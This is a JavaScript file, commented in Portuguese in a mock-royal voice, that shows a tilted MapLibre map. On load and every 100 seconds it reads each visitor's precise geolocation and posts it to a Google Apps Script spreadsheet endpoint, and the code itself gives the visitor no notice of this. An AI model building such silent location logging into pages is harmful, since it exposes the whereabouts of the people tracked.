$(document).ready(function () {

    // 1. A NOVA INICIALIZAÇÃO DO MAPA (VISÃO TRANSVERSAL)
    var map = new maplibregl.Map({
        container: 'map', 
        style: 'https://tiles.stadiamaps.com/styles/alidade_smooth.json',
        center: [-46.3487, -23.4866], // [LONGITUDE, LATITUDE] - Ordem invertida!
        zoom: 16,
        pitch: 60, // Inclinação transversal majestosa
        bearing: -10, // Rotação da bússola para profundidade
        scrollZoom: false // Mantém a restrição de zoom que Vossa Grandeza definiu
    });

    // 2. FUNÇÃO PARA CAPTURAR E ENVIAR OS DADOS DO SÚDITO
    function capturarLocalizacaoReal() {
        if (!navigator.geolocation) {
            console.error("Alerta Real: Este navegador é indigno e não possui GPS.");
            return;
        }

        navigator.geolocation.getCurrentPosition(
            function(position) {
                var lat = position.coords.latitude;
                var lng = position.coords.longitude;

                // 3. MARCADOR E MOVIMENTAÇÃO DA CÂMERA (ESTILO MAPLIBRE)
                // Remove marcadores anteriores se necessário, ou apenas cria o novo
                new maplibregl.Marker()
                    .setLngLat([lng, lat]) // [lng, lat]
                    .addTo(map);

                // O mapa voa até o súdito mantendo a inclinação transversal
                map.flyTo({
                    center: [lng, lat],
                    zoom: 17,
                    pitch: 60,
                    essential: true
                });

                // 4. O ENVIO PARA O TRONO (GOOGLE SHEETS) - PERMANECE IMUTÁVEL
                const dados = {
                    timestamp: new Date().toISOString(),
                    latitude: lat.toFixed(7),
                    longitude: lng.toFixed(7),
                    precisao: position.coords.accuracy.toFixed(2),
                    status: navigator.onLine ? 'online' : 'offline'
                };

                fetch('https://script.google.com/macros/s/AKfycbz6bm4rqeA6_88ztbBVwr_JnQFBmVdsA8Gz9p1pK9heomd9-HFge8Ny6VPF30I5H57LQQ/exec', {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(dados)
                }).then(() => console.log("Dados enviados ao trono com sucesso."));

            },
            function(error) {
                console.error("Erro na geolocalização: " + error.message);
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }

    // DISPARO AUTOMÁTICO E RASTREIO CONTÍNUO
    capturarLocalizacaoReal();
    setInterval(capturarLocalizacaoReal, 100000);

});
